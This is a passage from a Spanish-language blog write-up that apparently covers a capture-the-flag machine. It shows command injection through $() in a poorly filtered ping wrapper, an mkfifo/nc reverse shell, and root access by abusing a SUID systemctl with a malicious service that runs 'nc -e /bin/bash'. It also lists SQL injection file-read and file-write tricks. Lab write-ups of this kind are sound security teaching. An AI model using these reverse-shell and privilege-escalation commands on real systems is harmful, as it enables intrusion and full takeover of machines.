+            fecha <span style="color:#f92672">=</span> logEx[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">+</span> mes <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">+</span> logEx[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> logEx[<span style="color:#ae81ff">3</span>]
+            fecha <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>strptime(fecha, <span style="color:#e6db74">&#39;%Y-%m-</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %H:%M:%S&#39;</span>)
+            <span style="color:#66d9ef">if</span> fecha <span style="color:#f92672">&gt;</span> dat:
+                dat <span style="color:#f92672">=</span> fecha
+                req <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">10</span>]
+    <span style="color:#66d9ef">return</span> dat, req
+			
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_dict</span>(name):
+    month_dict <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Jan&#39;</span>:<span style="color:#e6db74">&#39;01&#39;</span>,<span style="color:#e6db74">&#39;Feb&#39;</span>:<span style="color:#e6db74">&#39;02&#39;</span>,<span style="color:#e6db74">&#39;Mar&#39;</span>:<span style="color:#e6db74">&#39;03&#39;</span>,<span style="color:#e6db74">&#39;Apr&#39;</span>:<span style="color:#e6db74">&#39;04&#39;</span>, <span style="color:#e6db74">&#39;May&#39;</span>:<span style="color:#e6db74">&#39;05&#39;</span>, <span style="color:#e6db74">&#39;Jun&#39;</span>:<span style="color:#e6db74">&#39;06&#39;</span>,<span style="color:#e6db74">&#39;Jul&#39;</span>:<span style="color:#e6db74">&#39;07&#39;</span>,<span style="color:#e6db74">&#39;Aug&#39;</span>:<span style="color:#e6db74">&#39;08&#39;</span>,<span style="color:#e6db74">&#39;Sep&#39;</span>:<span style="color:#e6db74">&#39;09&#39;</span>,<span style="color:#e6db74">&#39;Oct&#39;</span>:<span style="color:#e6db74">&#39;10&#39;</span>,<span style="color:#e6db74">&#39;Nov&#39;</span>:<span style="color:#e6db74">&#39;11&#39;</span>,<span style="color:#e6db74">&#39;Dec&#39;</span>:<span style="color:#e6db74">&#39;12&#39;</span>}
+    <span style="color:#66d9ef">return</span> month_dict[name]
+	
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_max_level</span>(lines):
+    level<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> lines:
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Level&#39;</span> <span style="color:#f92672">in</span> j:
+            <span style="color:#66d9ef">if</span> int(j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">4</span>]) <span style="color:#f92672">&gt;</span> int(level):
+                level <span style="color:#f92672">=</span> j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">4</span>]
+                req<span style="color:#f92672">=</span>j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">10</span>]
+    <span style="color:#66d9ef">return</span> level, req
+	
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_ping</span>():
+    forbidden <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;||&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>]
+    command <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;Enter an IP: &#39;</span>)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> forbidden:
+        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">in</span> command:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Got you&#39;</span>)
+            exit()
+    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;ping &#39;</span> <span style="color:#f92672">+</span> command)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    show_header()
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+        show_help()
+        exit()
+    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-h&#39;</span> <span style="color:#f92672">or</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;--help&#39;</span>:
+        show_help()
+        exit()
+    <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-s&#39;</span>:
+        show_statistics()
+        exit()
+    <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-l&#39;</span>:
+        list_ip()
+        exit()
+    <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-p&#39;</span>:
+        exec_ping()
+        exit()
+    <span style="color:#66d9ef">else</span>:
+        show_help()
+        exit()
+</code></pre></div><p>analizando el script vemos que  la ultima  funcion llamada <code>exec_ping</code>  ejecuta el comando <code>ping</code>, y filtra la entrada por ciertos carateres como</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">forbidden <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;||&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>]
+</code></pre></div><p>analizando el script y nos damos cuenta que no filtra los caracteres <code>$()</code> donde podriamos inyectar comandos asi que realizaremos una pequeña prueba consultamos con El siguiente <a href="https://github.com/payloadbox/command-injection-payload-list">Recurso</a> donde nos lista varios payloads para injectar comandos</p>
+<p><code>sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</code>
+<img src="https://i.imgur.com/ekhWBAY.png" alt=""></p>
+<p>ahora nos entablamos una reverse shell para eso vamos a crear un fichero y solamente lo ejecutaremos en la injection
+<code>/tmp/shell.sh</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.68 <span style="color:#ae81ff">443</span> &gt;/tmp/f
+</code></pre></div><p><img src="https://i.imgur.com/5g2z3Np.png" alt=""></p>
+<h3 id="priv-esc-pepper-to-root">Priv Esc Pepper To root</h3>
+<p><img src="https://i.imgur.com/cHZaPsa.png" alt="">
+enumerando con linpeas nos damos cuenta de que existe un fichero systemctl , con permisos ==SUID== del que podriamos aprovecharnos, asi que procedo a crearme el siguiente servicio</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
+Type<span style="color:#f92672">=</span>notify
+ExecStart<span style="color:#f92672">=</span>/bin/bash -c <span style="color:#e6db74">&#34;nc -e /bin/bash 10.10.14.68 9090&#34;</span>
+<span style="color:#f92672">[</span>Install<span style="color:#f92672">]</span>
+WantedBy<span style="color:#f92672">=</span>multi-user.target
+</code></pre></div><p>lo guardo en <code>/dev/shm/lemon.service</code></p>
+<p>hago linkeo el fichero con system ctl para que me lo registre al servicio</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">systemctl link /dev/shm/lemon.service
+systemcel start lemon
+</code></pre></div><p><img src="https://i.imgur.com/3MyuACy.png" alt=""></p>
+<p>nos ponemos en escucha y somos root</p>
+<p><img src="https://i.imgur.com/BVC1S9V.png" alt=""></p>
+<h2 id="leccines-aprendidas">Leccines Aprendidas</h2>
+<ol>
+<li>
+<p>hacer uso de funciones de SQL cuando nos encontramos con una SQLI
+1A) <code>load_file(&quot;/etc/passw&quot;)</code>
+1B)<code>&quot;Esto es una prueba&quot; into Outfile /var/www/html/images/$FileName</code></p>
+</li>
+<li>
+<p>Crear servicio , realizar el link para que systemctl lo registre , y lanzarlo</p>
+</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
+Type<span style="color:#f92672">=</span>notify
+ExecStart<span style="color:#f92672">=</span>/bin/bash -c <span style="color:#e6db74">&#34;nc -e /bin/bash 10.10.14.68 9090&#34;</span>
+<span style="color:#f92672">[</span>Install<span style="color:#f92672">]</span>
+WantedBy<span style="color:#f92672">=</span>multi-user.target
+</code></pre></div><p>Una muy buena maquina ,un encanto 💎💎</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
